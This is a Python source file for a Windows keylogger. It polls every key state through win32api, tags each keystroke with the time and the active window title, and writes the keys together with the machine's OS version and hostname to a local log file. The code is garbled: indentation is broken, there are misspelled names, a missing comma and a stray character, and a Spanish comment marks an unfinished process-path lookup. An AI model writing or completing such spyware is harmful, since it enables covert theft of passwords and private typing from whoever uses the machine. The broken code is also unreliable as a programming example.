import os
import time
from datetime import datetime
import win32api
import win32gui
import win32process

def error(msg, *args):
    print("[!] {}". format(msg.format(*args)))

def log(file, s):
    try:
        file.write(s)
        file.flush()
    except Exception as e:
        error("[-] Unable to write key to log file, Error: {}", e)
def key_notes(k, is_shift_or_caps):
    if 65 <= k <= 90 or 48 <= k <= 57:
        if is_shift_or_caps:
            return chr(k).upper()
        else:
            return chr(k).lower()
    elif 97 <= k <= 122:
        if is_shift_or_caps:
            return chr(k).upper()
        else:
            return chr(k).lower()
    else:
        special_keys = {
            0x01: "LEFT_MOUSE_BUTTON",
            0x02: "RIGHT_MOUSE_BUTTON", 
            0x03: "CANCEL",
            0x04: "MIDDLE_MOUSE_BUTTON",
            0x05: "X1_MOUSE_BUTTON",
            0x06: "X2_MOUSE_BUTTON",
        }
        return special_keys.get(k, "UNKNOWN_KEY_{}".format(k))
    def keylog(file):
        header_file(file)
        while True:
            time.sleep(0.01)
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            process_path = "" #Aqui se dberia obtener la ruta del proceso
            title = win32gui.GetWindowText(hwnd)
            now = datetime.now()
            is_shift_pressed = win32api.GetKeyState(0x10) & 0x8000 != 0

        for i in range (256):
            if win32api.GetAsyncKeyState(i) & 1:
                s = "[{:02}-{:02}-{:02}] |{}||{}| ({})\n".format(
                    now.hour(),
                    now.minute(),
                    now.second(),
                    process_path_strip(),
                    tittle.strip()
                    key_notes(i, is_shift_pressed),

                )
                log(file, s)
def header_file(file):
    os_info = "OS: type: {}\nVersion: {}\n".format(os.name, os.sys.getwindowsversion())
    log(file, os_info)
    hostname = os.environ.get("COMPUTERNAME", "NIL")
    log(file, "Hostname: {}\n".format(hostname))

def main():
    filename = "keycap.log"
    try:
        with open(filename, "w") as output:
            keylog(output)|
    except Exception as e:
        error("couldnt create Output file: {}\n", e)
    if __name__ == "__main__":
        main()